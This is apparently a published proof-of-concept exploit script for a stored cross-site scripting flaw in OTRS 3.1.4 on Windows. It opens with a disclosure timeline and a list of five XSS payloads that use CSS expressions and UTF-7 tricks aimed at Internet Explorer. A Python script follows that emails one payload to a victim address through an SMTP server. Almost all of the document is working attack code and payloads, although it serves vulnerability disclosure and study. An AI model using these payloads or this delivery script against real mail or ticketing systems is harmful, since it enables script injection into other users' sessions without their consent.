#!/usr/bin/python
 
'''
 
Author: loneferret of Offensive Security
Product: OTRS Open Technology Real Services
Version: 3.1.4 (Windows)
Vendor Site: http://www.otrs.com/en/
 
Timeline:
29 May 2012: Vulnerability reported to CERT
30 May 2012: Response received from CERT with disclosure date set to 20 Jul 2012
23 Jul 2012: Update from CERT: No response other than auto-reply from vendor
08 Aug 2012: Public Disclosure
 
Installed On: Windows Server 2003 SP2
Client Test OS: Window 7 Pro SP1 (x86)
Browser Used: Internet Explorer 9
 
Injection Point: Body
Injection Payload(s):
1: <DIV STYLE="width: expression(alert('XSS'));">
2: exp/*<XSS STYLE='no\xss:noxss("*//*");
xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
3: <IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
4: <XSS STYLE="xss:expression(alert('XSS'))">
5: <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
 
'''
 
import smtplib, urllib2
  
payload = """<DIV STYLE="width: expression(alert('XSS'));">"""
  
def sendMail(dstemail, frmemail, smtpsrv, username, password):
        msg  = "From: hacker@offsec.local\n"
        msg += "To: victim@victim.local\n"
        msg += 'Date: Today\r\n'
        msg += "Subject: Offensive Security\n"
        msg += "Content-type: text/html\n\n"
        msg += "XSS" + payload + "\r\n\r\n"
        server = smtplib.SMTP(smtpsrv)
        server.login(username,password)
        try:
                server.sendmail(frmemail, dstemail, msg)
        except Exception, e:
                print "[-] Failed to send email:"
                print "[*] " + str(e)
        server.quit()
  
username = "hacker@offsec.local"
password = "123456"
dstemail = "victim@victim.local"
frmemail = "hacker@offsec.local"
smtpsrv  = "172.16.84.171"
  
print "[*] Sending Email"
sendMail(dstemail, frmemail, smtpsrv, username, password)
